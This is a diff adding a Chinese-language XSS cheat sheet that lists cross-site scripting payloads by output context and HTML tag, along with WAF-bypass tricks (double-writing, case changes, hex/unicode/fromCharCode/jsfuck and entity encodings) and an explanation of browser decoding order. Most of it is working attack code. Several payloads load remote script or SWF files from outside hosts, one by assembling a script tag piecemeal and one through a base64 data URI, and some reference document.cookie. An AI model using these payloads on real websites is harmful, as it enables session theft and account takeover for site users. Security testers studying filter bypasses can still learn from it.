@@ -1,0 +1,691 @@
+# XSS备忘录
+
+## 0x00 渗透流程
+
+1. 观察输入输出点，测试waf过滤情况
+
+   ```javascript
+   简单: "'<script javascript onload src><a href></a>#$%^
+   全面: '";!-=#$%^&{()}<script javascript data onload href src img input><a href></a>alert(String.fromCharCode(88,83,83));prompt(1);confirm(1)</script>
+   ```
+
+   观察输入输出情况，一些特殊字符是否被编码、标签是否被过滤、输出点在标签之间或标签之内
+
+2. 依据输出位置进行XSS
+
+   - 标签之间：
+
+     ```javascript
+     模型： <div>[xss]</div>
+     payload： <script>alert(1)</script>或者<img src=1 onerror=alert(1)>
+     这些标签有：
+     <a> <p> <img> <body> <button> <var> <div> <object> <input> <select> <keygen> <frameset>  <embed> <svg> <video> <audio>
+     自带HtmlEncode（转义）功能的标签(RCDATA)，这是插入的javascript不会被执行，除非我们闭合掉它们。
+     <textarea></textarea>
+     <title></title>
+     <iframe></iframe>
+     <noscript></noscript>
+     <noframes></noframes>
+     <xmp></xmp>
+     <plaintext></plaintext>
+     其他：<math></math>也不行 
+     ```
+
+   - 在JS标签内：
+
+     在该位置，空格被过滤，可用/**/代替空格。输出在注释中，通过换行符%0a %0d使其逃逸出来。
+
+     1. 不在字符串内。
+
+        判断<>/是否被过滤。如果没有，那么直接插入就可以。
+
+        ```Javascript
+        <script>
+        [output]
+        </script>
+        payload：</script><script>alert(1)</script>
+        ```
+
+     2. 在字符串中
+
+        此时需要闭合字符串，并保证插入的JS代码符合语法规范。
+
+        如：
+
+        ```javascript
+        <script>
+        Var x="Input";
+        </script>
+        ```
+
+        input是输出点，我们首先要闭合双引号，才能保证XSS成功。如果我们无法闭合包括字符串的引号（引号被转义），就很难利用，除非存在两个输出点或宽字节。
+
+        前者在引号被转义成HTML实体时有效。此外，两个输出点的情况，也需要在某些特殊情况下才能构造。例子可参考[那些年我们一起学XSS|反斜线复仇记](https://wizardforcel.gitbooks.io/xss-naxienian/content/4.html)
+
+        后者，在引号被转义成\"时有效。在网页为GBK编码时，存在宽字节问题。
+
+        > 宽字节问题：
+        >
+        > GBK编码第一字节（高字节）的范围为：0x81~0xFE
+        >
+        > GBK编码第二字节（低字节）的范围为：0x40~0x7E、0x80~0xFE
+        >
+        > \符号的十六进制为0x5C, 刚好处在GBK的低字节中，如果前面有一个高字节（如%c0），那么
+        >
+        > 恰好会被组合成一个合法的字符，从而\被吃掉，双引号逃逸出来。
+
+        例子可参考[那些年我们一起学XSS|宽字节复仇记](https://wizardforcel.gitbooks.io/xss-naxienian/content/3.html)
+
+        ​
+
+   - 输出在HTML属性内
+
+     ​
+
+     1. 文本属性中
+
+        例如：`<input value="输出">` 、 `<img onload="...[输出]...">` ，再比如 `<body style="...[输出]...">`
+
+        - 无引号包裹，直接添加新的事件属性。
+        - 有引号包括。首先测试引号是否可用，可用则闭合属性之后添加新的事件属性。
+
+        HTML的属性，如果被进行HTML实体编码(形如&#039;&#x27)，那么HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构造payload。
+
+        当然，也可以闭合属性后，然后再执行脚本。
+
+     2. src/href/action/xlink:href/autofocus/content/data 等属性
+
+        直接使用伪协议绕过。
+
+        ```javascript
+        javascript 伪协议： <a href=javascript:alert(2)>test</a>
+        data 协议执行 javascript： <a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==>test</a>(Chrome被拦截，Firefox可以)
+        urlencode 版本： <a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E>(测试未通过)
+        不使用 href 的另外一种组合来执行 js： <svg><a xlink:href="javascript:alert(14)"><rect width="1000" height="1000" fill="white"/></a></svg>（均可） 或者： 
+          <math><a xlink:href=javascript:alert(1)>1</a></math>(Chrome不可，Firefox可以)
+        ```
+
+        如果不行，则测试添加事件进行触发。（首先还是需要闭合）
+
+        如：`<a href="test.com" onmouseover=alert(1)>ClickHere</a>`
+
+        ​
+
+     3. on*事件中
+
+        插入合乎逻辑的JS代码即可。也可以使用伪协议。
+
+        常见事件
+
+        ```js
+        onload 
+        onclick
+        onunload 
+        onchange 
+        onsubmit 
+        onreset 
+        onselect 
+        onblur 
+        onfocus 
+        onabort 
+        onkeydown 
+        onkeypress 
+        onkeyup 
+        ondbclick 
+        onmouseover 
+        onmousemove 
+        onmouseout 
+        onmouseup 
+        onforminput 
+        onformchange 
+        ondrag 
+        ondrop
+        ```
+
+        ​
+
+     4. style属性内及css代码之中IE可执行，并且在IE9以上被防御，不适合其他浏览器，基本已死。
+
+        ```
+        style="width:expression(js代码)"
+        background-image:url('javascript:alert(2)')
+        ```
+
+   - 输出在meta标签
+
+     ```javascript
+
+     <meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
+     ```
+
+     还有一些猥琐的思路，就是通过给http-equiv设置set-cookie，进一步重新设置 cookie 来干一些猥琐的事情。
+
+
+
+
+
+
+
+## 0x01 具体标签的Payload
+
+1. a标签
+
+   - javascript伪协议：
+
+     ```html
+     <a href=javascript:alert(2)>
+     ```
+
+   - data协议执行javascript：
+
+     ```Html
+     <a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==>
+     ```
+
+   ​
+
+   - urlencode版本：
+
+     ```html
+     <a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E>
+     ```
+
+   - 不使用href的另外一种组合来执行js：
+
+     ```html
+     <svg><a xlink:href="javascript:alert(14)"><rect width="1000" height="1000" fill="white"/></a></svg> 
+     ```
+
+     或者：
+
+     ```html
+     <math><a xlink:href=javascript:alert(1)></math>
+     ```
+
+2. script标签
+
+   - 最简单的测试payload：
+
+     ```html
+     <script>alert(1)</script>
+     ```
+
+   - jsfuck版本：
+
+     ```html
+     <script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>
+     ```
+
+     [jsfuck](http://www.jsfuck.com/)
+
+   - 各种编码版本：
+
+     ```html
+     <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script>
+
+     <script>prompt(-[])</script>//不只是alert。prompt和confirm也可以弹窗 
+
+     <script>alert(/3/)</script>//可以用"/"来代替单引号和双引号 
+
+     <script>alert(String.fromCharCode(49))</script> //我们还可以用char
+
+     <script>alert(/7/.source)</script> // ".source"不会影响alert(7)的执行
+
+     <script>setTimeout('alert(1)',0)</script> //如果输出是在setTimeout里，我们依然可以直接执行alert(1)
+     ```
+
+3. button标签
+
+   - event事件实现js调用：
+
+     ```html
+     <button/onclick=alert(1) >M</button>
+     ```
+
+   - html5的新姿势：
+
+     需要交互的版本：
+
+     ```html
+     <form><button formaction=javascript&colon;alert(1)>M
+     ```
+
+     不需要交互的版本：
+
+     ```html
+     <button onfocus=alert(1) autofocus>
+     ```
+
+4. p标签
+
+   - 如果发现变量输出在p标签中，只要能跳出`""`就足够了：
+     ```html
+     <p/onmouseover=javascript:alert(1); >M</p>
+     ```
+
+5. img标签
+
+   有些姿势是因为浏览器的不同而不能成功执行的。
+
+   - 只在chrome下有效：
+
+     ```html
+     <img src ?itworksonchrome?\/onerror = alert(1)>  //只在chrome下有效
+
+     <img/src/onerror=alert(1)>  //只在chrome下有效
+     ```
+
+   - 其他：
+
+     ```html
+     <img src=x onerror=alert(1)> 
+
+     <img src="x:kcf" onerror="alert(1)">
+     ```
+
+6. body标签
+
+   通过event事件来调用js
+
+   ```Html
+   <body onload=alert(1)> 
+   <body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+   ```
+
+7. var标签
+
+   ```html
+   <var onmouseover="prompt(1)">M</var>
+   ```
+
+8. div标签
+
+   ```html
+   <div/onmouseover='alert(1)'>X
+
+   <div style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert(52)">
+   ```
+
+9. iframe标签
+
+   有时候我们可以通过实体编码、换行和Tab字符来bypass。我们还可以通过事先在swf文件中插入我们的xss code，然后通过src属性来调用。不过关于flash，只有在crossdomain.xml文件中，allow-access-from domain="*"允许从外部调用swf时，才可以通过flash来事先xss attack。
+
+   下面的`&Tab;`为tab字符
+
+   ```html
+   <iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe> 
+   ```
+
+   ```html
+   <iframe SRC="http://0x.lv/xss.swf"></iframe> 
+   ```
+
+   ```html
+   <IFRAME SRC="javascript:alert(1);"></IFRAME> 
+   ```
+
+   ```Html
+   <iframe/onload=alert(1)></iframe>
+   ```
+
+10. meta标签
+
+  测试时发现昵称，文章标题跑到meta标签中，那么只需要跳出当前属性再添加`http-equiv="refresh"`，就可以构造一个有效地xss payload。还有一些猥琐的思路，就是通过给`http-equiv`设置`set-cookie`，进一步重新设置cookie来干一些猥琐的事情。
+
+  ```Html
+  <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+  ```
+
+  ```html
+  <meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">
+  ```
+
+11. object标签
+
+    和a标签的href属性的玩法是一样的，优点是无需交互。
+
+    ```Html
+    <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object>
+    ```
+
+12. marquee标签
+
+    ```Html
+    <marquee onstart="alert('1')"></marquee>
+    ```
+
+13. isindex标签
+
+    在一些只针对属性做了过滤的webapp中，action很有可能是漏网之鱼。
+
+    ```html
+    <isindex type=image src=1 onerror=alert(1)> 
+    ```
+
+    ```html
+    <isindex action=javascript:alert(1) type=image>
+    ```
+
+14. input标签
+
+    通过event来调用js。和button一样通过autofocus可以达到无需交互即可弹窗的效果。
+
+    ```html
+    <input onfocus=javascript:alert(1) autofocus> 
+
+    <input onblur=javascript:alert(1) autofocus><input autofocus>
+    ```
+
+15. select标签
+
+    ```Html
+    <select onfocus=javascript:alert(1) autofocus>
+    ```
+
+16. textarea标签
+
+    ```Html
+    <textarea onfocus=javascript:alert(1) autofocus>
+    ```
+
+17. keygen标签
+
+    ```html
+    <keygen onfocus=javascript:alert(1) autofocus>
+    ```
+
+18. frameset标签
+
+    ```html
+    <FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET> 
+    ```
+
+19. embed标签
+
+    ```html
+    <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></embed> //chrome 
+    ```
+
+    ```html
+    <embed src=javascript:alert(1)> //firefox
+    ```
+
+20. svg标签
+
+    ```html
+    <svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
+    ```
+
+    ```html
+    <svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>  //chrome有效
+    ```
+
+21. math标签
+
+    ```html
+    <math href="javascript:javascript:alert(1)">CLICKME</math> 
+
+    <math><y/xlink:href=javascript:alert(51)>test1 
+
+    <math> <maction actiontype="statusline#http://wangnima.com" xlink:href="javascript:alert(49)">CLICKME 
+    ```
+
+22. video标签
+
+    ```html
+    <video><source onerror="alert(1)"> 
+
+    <video src=x onerror=alert(48)>
+    ```
+
+    ​
+
+23. audio标签
+
+    ```html
+    <audio src=x onerror=alert(47)>
+    ```
+
+24. background属性
+
+    ```html
+    <table background=javascript:alert(1)></table> // 在Opera 10.5和IE6上有效
+    ```
+
+    ​
+
+25. poster属性
+
+    ```html
+    <video poster=javascript:alert(1)//></video> // Opera 10.5以下有效
+    ```
+
+26. code属性
+
+    ```html
+    <applet code="javascript:confirm(document.cookie);"> // Firefox有效
+    ```
+
+    ```html
+    embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+    ```
+
+27. expression属性
+
+    ```html
+    <img style="xss:expression(alert(0))"> // IE7以下
+
+    <div style="color:rgb(''&#0;x:expression(alert(1))"></div> // IE7以下
+
+    <style>#test{x:expression(alert(/XSS/))}</style> // IE7以下
+    ```
+
+
+
+
+
+## 0x02 一些过waf技巧
+
+- 单次过滤规则绕过：有些规则仅进行一次过滤替换，可以通过双重复写绕过`<scr<script>ipt>`
+
+- 大小写绕过：`<sCript>`
+
+- alert被过滤，可以尝试prompt和confirm
+
+- 没有引号和分号：`<IMG SRC=javascript:alert('XSS')>`
+
+- 空格被过滤：`<img/src=""onerror=alert(2)> <svg/onload=alert(2)></svg>`
+
+- 反引号妙用：
+
+- 长度限制时： ```<q/oncut=alert(1)>//在限制长度的地方很有效```
+
+- 单引号及双引号被过滤情况: `<script>alert(/jdq/)</script> //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显`
+
+- javascript伪协议
+
+  ```
+  <a href="javascript:alert(/test/)">xss</a>
+  <iframe src=javascript:alert('xss');height=0 width=0 /><iframe>利用iframe框架标签
+  ```
+
+- 畸形payload：```<IMG """><SCRIPT>alert("XSS")</SCRIPT>">```
+
+- /的妙用：```<script>alert(/3/)</script>```
+
+- 括号被过滤,可以使用throw来抛出数据
+
+  `<a onmouseover="javascript:window.onerror=alert;throw 1">2</a>`
+
+  `<img src=x onerror="javascript:window.onerror=alert;throw 1">`
+
+  以上两个测试向量在 Chrome 和 IE 上会出现一个 "uncaught" 错误，可以用下面的向量代替（下面向量在FireFox上测试失败）
+
+  `<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>`
+
+- 当=();:被过滤时:`<svg><script>alert&#40/1/&#41</script>`opera 中可以不闭合 `<svg><script>alert&#40 1&#41` // Opera可查
+
+- 过滤某些关键字（如：javascript） 可以在属性中的引号内容中使用空字符、空格、TAB换行、注释、特殊的函数，将代码行隔开。比如在使用`<iframe src="javascript:alert(1253)" height=0 width=0 /><iframe>`时，可以用回车、Tab键将src中的内容隔开，回车的url编码为%0a,%0b; 拼凑法：① 双写绕过；② 使用js定义变量z=scri, z+pt=script; ③ 两处输出点`<scri<!-- 第二处-->pt>`;
+
+- 无法使用href:
+
+  ```
+  <a onmouseover="alert(document.cookie)">xxs link</a>
+  在chrome下，其回补全缺失的引号。因此，也可以这样写：
+  <a onmouseover=alert(document.cookie)>xxs link</a>
+  ```
+
+
+   - 解决限制字符(要求同页面)
+
+     ```javascript
+     <script>z=’document.’</script>
+     <script>z=z+’write(“‘</script>
+     <script>z=z+’<script’</script>
+     <script>z=z+’ src=ht’</script>
+     <script>z=z+’tp://ww’</script>
+     <script>z=z+’w.shell’</script>
+     <script>z=z+’.net/1.’</script>
+     <script>z=z+’js></sc’</script>
+     <script>z=z+’ript>”)’</script>
+     <script>eval_r(z)</script>
+     ```
+
+     ​
+
+   - 编码：
+
+     - JS函数（如eval，settimeout）还有就是`href= action= formaction= location= on*= name= background= poster= src= code=`这些地方，可以配合编码。此外，data属性可以base64编码。
+
+       1. js16进制
+
+          ```javascript
+          <script>eval(“js+16进制加密”)</script>
+          <script>eval("\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29")</script>
+          编码要执行的语句↓
+          Alert(“xss”)
+          ```
+
+       2. js unicode
+
+          ```javascript
+          <script>eval("unicode加密")</script>
+          //js unicode加密 解决alert()被过滤
+          <script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")</script>
+          ```
+
+       3. String.fromCharCode函数（不需要任何引号，必须函数内）
+
+          ```javascript
+          <script>eval(String.fromCharCode编码内容))</script>
+          <script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>
+          ```
+
+       4. jsfuck版本
+
+          ```html
+          <script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>
+          ```
+
+       5. HTML编码：
+
+           ```html
+              <img src='1' onerror='aler&#x0074;(1)'>
+           ```
+
+       6. base64编码（仅data支持）
+
+            ```html
+               <object data="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUnE5bjZ6dT48L3NjcmlwdD4="></object>
+               格式：
+               Data:<mime type>,<encoded data>
+               Data //协议
+               <mime type> //数据类型
+               charset=<charset>  //指定编码
+               [;base64] //被指定的编码
+               <encoded data> //定义data协议的编码
+               特点：不支持IE
+            ```
+
+- 存在json数据解析 context： `<?=json_encode($_GET['x'])?>` payload： `?x=<img+src=x+onerror=ö-alert(1)>`
+
+- SVG 标签
+
+  当返回结果在 svg 标签中的时候，会有一个特性 `<svg><script>varmyvar="YourInput";</script></svg>` YourInput 可控，输入 `www.site.com/test.php?var=text";alert(1)//` 如果把 " 编码一些他仍然能够执行: `<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>`
+
+  ​
+
+  ​
+
+
+---
+
+## 0x03 
+
+## 0x04 其它知识
+
+### 浏览器解析规则
+
+**URL编码：**
+
+一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)
+
+**HTML实体编码：**
+
+- 命名实体：以&开头，分号结尾的，例如“<”的编码是“&lt;”
+- 字符编码：十进制、十六进制ASCII码或unicode字符编码，样式为“&#数值;”,例如“<”可以编码为“&#060;”和“&#x3c;”
+
+**JS编码：**js提供了四种字符编码的策略
+
+```
+1、三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145”
+2、两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65”
+3、四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065”
+4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）
+5、jsfuck编码
+```
+
+**CSS编码：**用一个反斜线(\)后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”
+
+HTML解析器能识别在文本节点和参数值里的实体编码，并在内存里创建文档树的表现形式时，透明的对这些编码进行解码
+
+浏览器的解析规则：浏览器收到HTML内容后，会从头开始解析。当遇到JS代码时，会使用JS解析器解析。当遇到URL时，会使用URL解析器解析。遇到CSS则用CSS解析器解析。尤其当遇到复杂代码时，可能该段代码会经过多个解析器解析。
+
+比如：
+
+```html
+<a href="javascript:window.open('http://www.baidu.com')">test</a>
+```
+
+这段代码，HTML解析器首先工作（注：此时，若href="字符串"中的字符串存在字符引用，会对其解码）。然后URL解析器开始对href值进行URL解析。进行URL解析时，URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。即，javascript:是不能进行任何js编码的。解析了javascript：之后，会由JS解析器进行解析。JS解析器针对一些编码，其只有在标志符名称里的编码字符才能够被正常的解析。解析完window.open以后，又会由URL解析器进行解析。想了解各解析器的特性，可参考这篇文章[深入理解浏览器解析机制和XSS向量编码](http://bobao.360.cn/learning/detail/292.html)
+
+JS解析器不会解析和解码字符引用，而针对JS的一些编码其会视情况而定。
+
+可以看到，该代码经过了HTML->URL->JS->URL 四重解析。由于不同的解析器能够分别对一些编码格式进行解析，所以我们可以通过生成特定格式的编码代码，令其在依次解码后能够正确执行，从而绕过WAF。
+
+如：
+
+```HTML
+<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29">test</a>
+```
+
+该代码能够正确执行。
+
+首先，经过HTML解析之后，代码会变成
+
+```html
+<a href="javascript:%61%6c%65%72%74%28%32%29">test</a>
+```
+
+此时，由于javascript已经生成，不违反URL解析规则。所以，URL解析正常。解析了javascript，最终进入JS解析器。注意，URL解析器还完成了URL解码工作。
+
+```html
+<a href="javascript:alert(2)">test</a>
+```
+
+所以，JS最终解析的代码时alert(2).成功执行。
+
+总结来说，各种编码在XSS中的利用非常灵活，我们需要在充分了解浏览器的解析原理合理构造合理编码顺序的代码，最终构造出Payload。
+
+
+
